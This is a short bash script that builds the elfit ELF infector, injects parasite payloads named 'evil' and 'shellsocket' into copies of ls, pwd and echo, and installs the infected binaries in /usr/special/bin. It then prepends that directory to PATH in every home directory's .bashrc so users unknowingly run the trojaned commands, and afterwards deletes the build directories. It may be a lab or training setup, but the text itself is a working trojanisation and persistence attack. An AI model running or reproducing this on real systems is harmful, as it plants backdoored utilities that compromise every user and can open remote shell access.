#!/bin/bash
cd /tmp
git clone https://github.com/NickStephens/elfit
cd elfit
make
cd parasites
nasm evil.asm
nasm shellsocket.asm
cd ..
cp /bin/ls /bin/cat /bin/pwd /bin/echo /bin/date .

echo " #Infecting ls" >> output
./elfit -p parasites/evil -t -e ls >> output
echo "" >> output

echo " #Infecting pwd" >> output
./elfit -p parasites/shellsocket -r -e pwd >> output
echo "" >> output

echo " #Infecting echo" >> output
./elfit -p parasites/evil -t --start-main init echo >> output
echo "" >> output

mv output /tmp
mkdir /usr/special
mkdir /usr/special/bin
mv ls cat pwd echo date /usr/special/bin

for f in `find /home -maxdepth 1 -type d`; do
  if [ $f != "/home" ] ; then
    echo "PATH=/usr/special/bin:$PATH" >> $f/.bashrc
  fi
done

rm -rf /tmp/elf /tmp/elfit
